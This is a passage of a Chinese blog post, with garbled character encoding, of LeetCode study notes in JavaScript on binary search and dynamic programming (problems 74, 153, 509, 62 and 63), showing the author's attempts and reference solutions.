nums[<span class="number">0</span>])) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[<span class="number">0</span>] &gt; nums[mid] &amp;&amp; (target &gt; nums[mid] &amp;&amp; target &lt; nums[<span class="number">0</span>])) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[left] === target ? left : -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ACï¼Œä½†æ˜¯è°ƒè¯•äº†å¾ˆä¹…æ‰å†™å‡ºæ¥ã€‚äºŒåˆ†çš„æ€è·¯æœ‰å˜åŒ–ï¼Œéœ€è¦å¤šè€ƒè™‘ä¸€äº›æƒ…å†µã€‚<strong>åŒæ—¶éœ€æ³¨æ„</strong>å¯ä»¥å…ˆåˆ¤æ–­ nums æ•°ç»„æœ‰é›¶ä¸ªæˆ–è€…ä¸€ä¸ªå…ƒç´ çš„æƒ…å†µã€‚</p><h2 id="LeetCode74â€”â€”æœç´¢äºŒç»´çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode74â€”â€”æœç´¢äºŒç»´çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode74â€”â€”æœç´¢äºŒç»´çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode74â€”â€”æœç´¢äºŒç»´çŸ©é˜µï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/search-a-2d-matrix/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -9"><a href="#è‡ªå·±çš„ä»£ç -9" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> searchMatrix = <span class="function"><span class="keyword">function</span>(<span class="params">matrix, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> a <span class="keyword">of</span> matrix) &#123;</span><br><span class="line">        arr.push(...a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> left = <span class="number">0</span>, right = arr.length;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>((left + right) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &gt;= target) &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr[right] === target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ACï¼Œå¾ˆç®€å•çš„æƒ³æ³•ï¼Œå˜æˆå‡åºçš„æ•°ç»„åäºŒåˆ†æŸ¥æ‰¾ã€‚å¤æ‚åº¦Oï¼ˆnï¼‰ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£-3"><a href="#æ€è·¯-amp-é¢˜è§£-3" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">searchMatrix</span>(<span class="params">matrix, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!matrix.length || !matrix[<span class="number">0</span>].length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> row = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> col = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (col &gt;= <span class="number">0</span> &amp;&amp; row &lt;= matrix.length - <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (matrix[row][col] === target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (matrix[row][col] &gt; target) col--;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (matrix[row][col] &lt; target) row++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¥½åƒè¿™æ ·æ›´ç²¾ç®€äº›ã€‚</p><h2 id="LeetCode153â€”â€”å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼ï¼ˆâ˜†â˜†ï¼‰"><a href="#LeetCode153â€”â€”å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼ï¼ˆâ˜†â˜†ï¼‰" class="headerlink" title="LeetCode153â€”â€”å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼ï¼ˆâ˜†â˜†ï¼‰"></a>LeetCode153â€”â€”å¯»æ‰¾æ—‹è½¬æ’åºæ•°ç»„ä¸­çš„æœ€å°å€¼ï¼ˆâ˜†â˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -10"><a href="#è‡ªå·±çš„ä»£ç -10" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[nums.length - <span class="number">1</span>] &lt; nums[<span class="number">0</span>]) &#123;</span><br><span class="line">      nums.unshift(nums[nums.length - <span class="number">1</span>]);</span><br><span class="line">      nums.pop(nums[nums.length - <span class="number">1</span>])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>çœ‹äº†é¢˜è§£åå‘ç°è¿™å°±æ˜¯ä¼ è¯´ä¸­çš„â€œæš´ç ´â€æ³•ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºOï¼ˆnï¼‰</p><h3 id="æ€è·¯-amp-é¢˜è§£-4"><a href="#æ€è·¯-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a>æ€è·¯&amp;é¢˜è§£</h3><p>äºŒåˆ†æ³•ï¼šé¦–å…ˆï¼Œåˆ›å»ºä¸¤ä¸ªæŒ‡é’ˆ left, right åˆ†åˆ«æŒ‡å‘ numbers é¦–å°¾æ•°å­—ï¼Œç„¶åè®¡ç®—å‡ºä¸¤æŒ‡é’ˆä¹‹é—´çš„ä¸­é—´ç´¢å¼•å€¼ middleï¼Œç„¶åæˆ‘ä»¬ä¼šé‡åˆ°ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><ol><li>middle &gt; right ï¼šä»£è¡¨æœ€å°å€¼ä¸€å®šåœ¨ middle å³ä¾§ï¼Œæ‰€ä»¥ left ç§»åˆ° middle+1 çš„ä½ç½®ã€‚</li><li>middle&lt; rightï¼šä»£è¡¨æœ€å°å€¼ä¸€å®šåœ¨ middle å·¦ä¾§æˆ–è€…å°±æ˜¯ middleï¼Œæ‰€ä»¥ right ç§»åˆ° middle çš„ä½ç½®ã€‚</li><li>middle æ—¢ä¸å¤§äº left æŒ‡é’ˆçš„å€¼ï¼Œä¹Ÿä¸å°äº right æŒ‡é’ˆçš„å€¼ï¼Œä»£è¡¨ç€ middle å¯èƒ½ç­‰äº left æŒ‡é’ˆçš„å€¼ï¼Œæˆ–è€… right æŒ‡é’ˆçš„å€¼ï¼Œæˆ‘ä»¬è¿™æ—¶å€™åªèƒ½è®© right æŒ‡é’ˆé€’å‡ï¼Œæ¥ä¸€ä¸ªä¸€ä¸ªæ‰¾æœ€å°å€¼äº†ã€‚</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findMin = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">        <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((left + right) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &gt; nums[right]) left = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> right = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[left];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æš´ç ´ã€ä¸æ¨èã€‘</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMin</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] &lt; nums[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ"><a href="#å¤æ‚åº¦åˆ†æ" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šæ—¶é—´å¤æ‚åº¦ä¸º O(logn)ï¼Œå…¶ä¸­ n æ˜¯æ•°ç»„ nums çš„é•¿åº¦ã€‚åœ¨äºŒåˆ†æŸ¥æ‰¾çš„è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€æ­¥ä¼šå¿½ç•¥ä¸€åŠçš„åŒºé—´ï¼Œå› æ­¤æ—¶é—´å¤æ‚åº¦ä¸º O(logn)ã€‚</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚</p></li></ul><h1 id="åŠ¨æ€è§„åˆ’-Dynamic-Programming"><a href="#åŠ¨æ€è§„åˆ’-Dynamic-Programming" class="headerlink" title="åŠ¨æ€è§„åˆ’ Dynamic Programming"></a>åŠ¨æ€è§„åˆ’ Dynamic Programming</h1><h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p>â€œSimplifying a complicated problem by breaking it down into simpler sub-problemsâ€</p><p><strong>åˆ†æ²» + æœ€ä¼˜å­ç»“æ„</strong></p><h2 id="åŒºåˆ«"><a href="#åŒºåˆ«" class="headerlink" title="åŒºåˆ«"></a>åŒºåˆ«</h2><p>åŠ¨æ€è§„åˆ’å’Œé€’å½’æˆ–è€…åˆ†æ²»æ²¡æœ‰æ ¹æœ¬ä¸Šçš„åŒºåˆ«ï¼ˆå…³é”®çœ‹æœ‰æ— æœ€ä¼˜çš„å­ç»“æ„ï¼‰</p><ul><li>å…±æ€§ï¼šæ‰¾åˆ°<strong>é‡å¤å­é—®é¢˜</strong></li><li>å·®å¼‚æ€§ï¼šæœ€ä¼˜å­ç»“æ„ã€ä¸­é€”å¯ä»¥<strong>æ·˜æ±°æ¬¡ä¼˜è§£</strong></li></ul><h2 id="LeetCode509â€”â€”æ–æ³¢é‚£å¥‘æ•°ï¼ˆâ˜†ï¼‰"><a href="#LeetCode509â€”â€”æ–æ³¢é‚£å¥‘æ•°ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode509â€”â€”æ–æ³¢é‚£å¥‘æ•°ï¼ˆâ˜†ï¼‰"></a>LeetCode509â€”â€”æ–æ³¢é‚£å¥‘æ•°ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/fibonacci-number/">è·³è½¬åœ°å€</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &lt;= <span class="number">1</span> ? n : fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ˜¯å‚»é€’å½’ï¼Œæ—¶é—´å¤æ‚åº¦Oï¼ˆ2^nï¼‰ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-5"><a href="#æ€è·¯1-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>Memorization è®°å¿†åŒ–æœç´¢ï¼Œå³å°†è¿‡ç¨‹ç»“æœå­˜åœ¨æ•°ç»„ä¸­ã€‚ï¼ˆè‡ªé¡¶å‘ä¸Šï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span> (<span class="params">n, memo = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!memo[n]) &#123;</span><br><span class="line">        memo[n] = fib(n - <span class="number">1</span>, memo) + fib(n - <span class="number">2</span>, memo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-4"><a href="#æ€è·¯2-amp-é¢˜è§£-4" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>è‡ªåº•å‘ä¸Šé€’æ¨ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a = [];</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>, a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        a[i] = a[i - <span class="number">1</span>] + a[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a[n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode62â€”â€”ä¸åŒè·¯å¾„ï¼ˆâ˜†ï¼‰"><a href="#LeetCode62â€”â€”ä¸åŒè·¯å¾„ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode62â€”â€”ä¸åŒè·¯å¾„ï¼ˆâ˜†ï¼‰"></a>LeetCode62â€”â€”ä¸åŒè·¯å¾„ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/unique-paths/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -11"><a href="#è‡ªå·±çš„ä»£ç -11" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePaths = <span class="function"><span class="keyword">function</span>(<span class="params">m, n, arr=[]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m === <span class="number">1</span> || n === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!arr[m][n]) &#123;</span><br><span class="line">        arr[m][n] = uniquePaths(m - <span class="number">1</span>, n, arr) + uniquePaths(m, n - <span class="number">1</span>, arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr[m][n];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœªACã€‚äºŒç»´æ•°ç»„åº”è¯¥ä¸èƒ½è¿™æ ·å†™ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-6"><a href="#æ€è·¯1-amp-é¢˜è§£-6" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>é€’å½’ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePaths = <span class="function"><span class="keyword">function</span>(<span class="params">m, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> memo = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; memo.length; i++)&#123;</span><br><span class="line">        memo[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> helper(m, n, <span class="number">1</span>, <span class="number">1</span>, memo);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> helper = <span class="function"><span class="keyword">function</span> (<span class="params">m, n, row, col, memo</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (row === m &amp;&amp; col === n) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (row &gt; m || col &gt; n) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (memo[row][col] === -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> rightPath = helper(m, n, row, col + <span class="number">1</span>, memo);</span><br><span class="line">        <span class="keyword">let</span> downPath = helper(m, n, row + <span class="number">1</span>, col, memo);</span><br><span class="line">        memo[row][col] = rightPath + downPath;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memo[row][col];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯2-amp-é¢˜è§£-5"><a href="#æ€è·¯2-amp-é¢˜è§£-5" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><p>åŠ¨æ€è§„åˆ’ï¼šè‡ªåº•å‘ä¸Šé€’æ¨ï¼Œå·¦ä¸Šæ–¹è·¯å¾„æ•°ï¼å³+ä¸‹ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uniquePaths = <span class="function">(<span class="params">m, n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++) &#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    dp[m][n] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> row = m - <span class="number">1</span>; row &gt; <span class="number">0</span>; row--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> col = n - <span class="number">1</span>; col &gt; <span class="number">0</span>; col--)&#123;</span><br><span class="line">            dp[row][col] = dp[row + <span class="number">1</span>][col] + dp[row][col + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼šä»å·¦ä¸Šåˆ°å³ä¸‹ï¼š(è¿™æ ·æ–¹ä¾¿å¤šäº†ã€ã€)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uniquePaths = <span class="function">(<span class="params">m, n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// dp æ•°ç»„åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m).fill(<span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ€è·¯3-amp-é¢˜è§£"><a href="#æ€è·¯3-amp-é¢˜è§£" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uniquePaths = <span class="function">(<span class="params">m, n</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// dp æ•°ç»„åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            dp[j] += dp[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åªç”¨ä¸€ä½æ•°ç»„å­˜å‚¨ç»“æœï¼Œæ›´åŠ èŠ‚çœç©ºé—´ã€‚</p><h2 id="LeetCode63â€”â€”ä¸åŒè·¯å¾„IIï¼ˆâ˜†ï¼‰"><a href="#LeetCode63â€”â€”ä¸åŒè·¯å¾„IIï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode63â€”â€”ä¸åŒè·¯å¾„IIï¼ˆâ˜†ï¼‰"></a>LeetCode63â€”â€”ä¸åŒè·¯å¾„IIï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/unique-paths-ii/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -12"><a href="#è‡ªå·±çš„ä»£ç -12" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePathsWithObstacles = <span class="function"><span class="keyword">function</span>(<span class="params">obstacleGrid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">if</span> (obstacleGrid[m - <span class="number">1</span>][n - <span class="number">1</span>] === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (obstacleGrid[i][n - <span class="number">1</span>] === <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i][n - <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (obstacleGrid[m - <span class="number">1</span>][i] === <span class="number">0</span>) &#123;</span><br><span class="line">            dp[m - <span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = m-<span class="number">2</span>; row &gt;= <span class="number">0</span>; row--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> col = n-<span class="number">2</span>; col &gt;= <span class="number">0</span>; col--)&#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[row][col] === <span class="number">1</span>) &#123;</span><br><span class="line">                dp[row][col] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[row][col] = dp[row + <span class="number">1</span>][col] + dp[row][col + <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœªACï¼Œå¤´ç–¼ï¼Œè°ƒè¯•äº†ä¸€ä¸ªå¤šå°æ—¶ä¹Ÿæ²¡å¼„å‡ºæ¥ã€‚æ€è·¯æ˜¯ä»å³ä¸‹å¾€å·¦ä¸Šé€’å½’ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£-7"><a href="#æ€è·¯1-amp-é¢˜è§£-7" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>è¿™æ˜¯ä»å·¦ä¸Šå¼€å§‹å¾€å³ä¸‹é€’å½’ï¼šï¼ˆè¿™æ ·å°±ä¸ç”¨è€ƒè™‘ dp æ•°ç»„ä¸ obstacleGrid æ•°ç»„çš„å¤§å°å…³ç³»ï¼Œæ¯”ä»å³ä¸‹å¼€å§‹é€’å½’æ–¹ä¾¿å¤šäº†ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> uniquePathsWithObstacles = <span class="function"><span class="keyword">function</span>(<span class="params">obstacleGrid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = obstacleGrid.length, n = obstacleGrid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="comment">// dp æ•°ç»„åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">    <span class="keyword">const</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m).fill(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(n).fill(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ä¸¤æ¡è¾¹ï¼Œé‡åˆ°éšœç¢ç‰©åˆ™ä¸º0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m &amp;&amp; obstacleGrid[i][<span class="number">0</span>] === <span class="number">0</span>; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n &amp;&amp; obstacleGrid[<span class="number">0</span>][j] === <span class="number">0</span>; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä»å·¦å¾€å³ã€ä»ä¸Šåˆ°ä¸‹éå†</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="comment">// 